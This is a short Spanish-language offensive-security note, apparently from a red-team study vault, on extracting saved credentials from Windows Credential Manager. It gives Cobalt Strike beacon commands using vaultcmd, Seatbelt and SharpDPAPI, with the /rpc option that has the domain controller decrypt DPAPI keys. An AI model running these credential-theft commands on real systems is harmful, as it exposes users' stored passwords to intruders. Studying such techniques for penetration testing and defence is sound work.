---
title: Windows Credential Manager
tags: [ad, credential-manager, dpapi, sharpdpapi, vaultcmd, beacon]
---

# Windows Credential Manager

Almacena credenciales que el usuario ha pedido a Windows guardar: conexiones RDP, VPNs, etc.

## Enumerar credenciales almacenadas

```
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
```

Con Seatbelt:
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```

## Extraer credenciales con SharpDPAPI

Las credenciales se cifran con AES + DPAPI master key. **SharpDPAPI** simplifica el proceso:

```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```

> [!note] Sobre `/rpc`
> Si no hay claves cacheadas, `/rpc` aprovecha el **Microsoft BackupKey Remote Protocol (MS-BKRP)** para que el DC descifre la clave AES. Funciona porque los DCs mantienen copia de la DPAPI master key del usuario.

## Ver también
- [[04-lateral-movement/credential-access/credentials-from-web-browsers|Credentials from Web Browsers]]
- [[03-post-explotacion/credential-access/os-credential-dumping|OS Credential Dumping]]
